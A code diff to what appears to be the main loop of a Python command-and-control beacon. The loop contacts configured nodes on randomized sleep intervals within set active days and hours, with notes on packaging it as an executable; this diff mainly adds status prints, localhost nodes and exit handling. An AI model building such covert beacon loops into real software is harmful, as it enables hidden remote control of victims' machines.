@@ -10,20 +10,20 @@ from random import randint
 # - A pyinstaller
 #
 # TODO:
-# - Prevent replay
+# - Prevent replays
 # - Add active day and active hour calculation to calculate_sleep()
 #
 # READ:
 # - http://docs.python-guide.org/en/latest/shipping/freezing/
 # - http://stackoverflow.com/questions/13629321/handling-dynamic-import-with-py2exe
 # - http://www.pythoncentral.io/pyinstaller-package-python-applications-windows-mac-linux/
-# - http://stackoverflow.com/questions/9689355/python-import-or-pass-modules-as-paramaters
+PROMPT = "[]>"
 
 MIN_SLEEP_INT = 60
 MAX_SLEEP_INT = 600
 ACTIVE_DAYS = ('M','T','W','Th','F','Sa','Su')
 ACTIVE_HOURS = ('0001','2359')
-NODES = [('http_get','192.168.2.2','80'),('http_get','192.168.2.3','5585')]
+NODES = [('http_get',{'node':'127.0.0.1','port':'8080'}),('http_get',{'node':'127.0.0.1','port':'8090'})]
 
 # global flag
 continue_beacon = True
@@ -55,22 +55,28 @@ def start_beacon_loop(controller):
     while continue_beacon:
         
         controller.beacon(NODES)
-        time.sleep(calculate_sleep())
+        sleep_int = calculate_sleep()
+        print PROMPT + " Sleeping for %d seconds" % (sleep_int)
+        time.sleep(sleep_int)
         
     return True
                 
 
 def main():
     
-    print "starting..."
+    print PROMPT + " Starting..."
     beacons, commands, decoders, encoders, responders = load_config()
     
-    print "Building controller..."
+    print PROMPT + " Building controller..."
     controller = Controller(beacons, commands, decoders, encoders, responders)
     
-    print "Starting beaconer..."
+    print PROMPT + " Starting beaconer loop..."
     start_beacon_loop(controller)
-    print "finished!"
+    
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except (KeyboardInterrupt, SystemExit):
+        print PROMPT + " Exiting"
+        exit()
